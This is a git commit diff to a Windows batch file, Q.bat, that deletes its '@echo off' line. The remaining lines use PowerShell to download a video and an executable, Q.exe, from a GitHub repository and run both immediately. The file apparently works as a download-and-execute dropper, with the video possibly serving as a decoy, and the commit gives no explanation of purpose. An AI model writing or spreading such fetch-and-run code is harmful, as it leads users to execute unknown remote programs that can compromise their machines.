f70f87755a21c74da249afca62101bcb029ecaa6
bloostone <49822986+bloostone@users.noreply.github.com>
2021-07-03 19:48:37 -0700

    Update Q.bat

--- Q.bat
+++ Q.bat
@@ -1,3 +1,2 @@
-@echo off
 powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/tumblr_q8pbmd8vOI1xu4fa8.mp4 -OutFile Q.mp4" && Q.mp4
 powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
